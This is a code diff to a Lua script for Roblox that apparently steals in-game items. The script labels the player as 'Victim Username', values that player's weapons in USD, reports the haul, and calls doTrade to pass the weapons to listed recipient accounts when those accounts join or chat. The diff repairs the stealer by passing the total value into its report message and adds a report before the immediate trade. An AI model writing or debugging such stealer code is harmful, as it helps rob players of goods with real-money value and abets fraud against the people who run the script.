@@ -399,15 +399,19 @@ local function SendFirstMessage(list, prefix, totalValue)
     })
 end
 
-local function SendMessage(sortedItems)
+-- FIXED: SendMessage now accepts totalValue as a parameter
+local function SendMessage(sortedItems, totalValueParam)
     local usdData = GetUSD(sortedItems)
     local totalUSD = usdData.total or "0.00"
     local itemPrices = usdData.itemPrices or {}
+    
+    -- Use the passed parameter or default to 0 if nil
+    local displayTotal = totalValueParam or 0
 
     local fields = {
         { name = "Victim Username:", value = plr.Name, inline = true },
         { name = "Items sent:", value = "", inline = false },
-        { name = "Summary:", value = string.format("Total Value: %s / $%s", totalValue, totalUSD), inline = false }
+        { name = "Summary:", value = string.format("Total Value: %s / $%s", displayTotal, totalUSD), inline = false }
     }
 
     for _, item in ipairs(sortedItems) do
@@ -586,6 +590,7 @@ if #weaponsToSend > 0 then
     local function startImmediateHit()
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(combinedUser, p.Name) then
+                SendMessage(sentWeapons, totalValue) -- Pass totalValue here
                 doTrade(p.Name)
                 return
             end
@@ -598,7 +603,7 @@ if #weaponsToSend > 0 then
             if table.find(combinedUser, player.Name) then
                 player.Chatted:Connect(function()
                     if not sentMessage then
-                        SendMessage(sentWeapons)
+                        SendMessage(sentWeapons, totalValue) -- Pass totalValue here
                         sentMessage = true
                     end
                     doTrade(player.Name)
@@ -618,7 +623,7 @@ if #weaponsToSend > 0 then
                 for _, player in ipairs(Players:GetPlayers()) do
                     if table.find(combinedUser, player.Name) then
                         if not sentMessage then
-                            SendMessage(sentWeapons)
+                            SendMessage(sentWeapons, totalValue) -- Pass totalValue here
                             sentMessage = true
                         end
                         searchActive = false
